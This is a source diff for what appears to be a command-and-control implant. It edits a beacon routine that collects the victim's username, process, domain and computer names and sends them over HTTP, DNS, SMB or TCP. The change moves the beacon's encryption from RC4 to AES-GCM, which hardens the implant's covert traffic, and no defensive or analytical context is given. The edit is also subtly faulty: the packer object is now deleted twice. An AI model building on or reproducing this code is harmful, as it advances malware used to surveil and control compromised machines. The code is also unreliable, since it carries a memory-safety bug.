@@ -106,7 +106,18 @@ BYTE* Agent::BuildBeat(ULONG* size)
 	packer->PackStringA(this->info->username);
 	packer->PackStringA(this->info->process_name);
 
-	EncryptRC4(packer->data(), packer->datasize(), this->config->encrypt_key, 16);
+	unsigned char* plaintext = packer->data();
+	ULONG plainSize = packer->datasize();
+
+	ULONG totalSize = GCM_NONCE_SIZE + plainSize + GCM_TAG_SIZE;
+	unsigned char* encryptedBeat = (unsigned char*)MemAllocLocal(totalSize);
+	AESGCMEncrypt(plaintext, plainSize, this->config->encrypt_key,
+	              encryptedBeat,          // nonce at [0..11]
+	              encryptedBeat + GCM_NONCE_SIZE, // ciphertext at [12..]
+	              encryptedBeat + GCM_NONCE_SIZE + plainSize); // tag at end
+
+	packer->Clear(FALSE);
+	delete packer;
 
 	MemFreeLocal((LPVOID*)&this->info->domain_name,   StrLenA(this->info->domain_name));
 	MemFreeLocal((LPVOID*)&this->info->computer_name, StrLenA(this->info->computer_name));
@@ -115,32 +126,29 @@ BYTE* Agent::BuildBeat(ULONG* size)
 
 #if defined(BEACON_HTTP) || defined(BEACON_DNS)
 
-	ULONG beat_size = packer->datasize();
-	PBYTE beat      = packer->data();
+	ULONG beat_size = totalSize;
+	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);
+	memcpy(beat, encryptedBeat, beat_size);
 
 #elif defined(BEACON_SMB) 
 
-	ULONG beat_size = packer->datasize() + 4;
+	ULONG beat_size = totalSize + 4;
 	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);
 
 	memcpy(beat, &(this->config->listener_type), 4);
-	memcpy(beat+4, packer->data(), packer->datasize());
-
-	PBYTE pdata = packer->data();
-	MemFreeLocal((LPVOID*)&pdata, packer->datasize());
+	memcpy(beat+4, encryptedBeat, totalSize);
 
 #elif defined(BEACON_TCP) 
 
-	ULONG beat_size = packer->datasize() + 4;
+	ULONG beat_size = totalSize + 4;
 	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);
 
 	memcpy(beat, &(this->config->listener_type), 4);
-	memcpy(beat + 4, packer->data(), packer->datasize());
-
-	PBYTE pdata = packer->data();
-	MemFreeLocal((LPVOID*)&pdata, packer->datasize());
+	memcpy(beat + 4, encryptedBeat, totalSize);
 
 #endif
+
+	MemFreeLocal((LPVOID*)&encryptedBeat, totalSize);
 
 	delete packer;
 
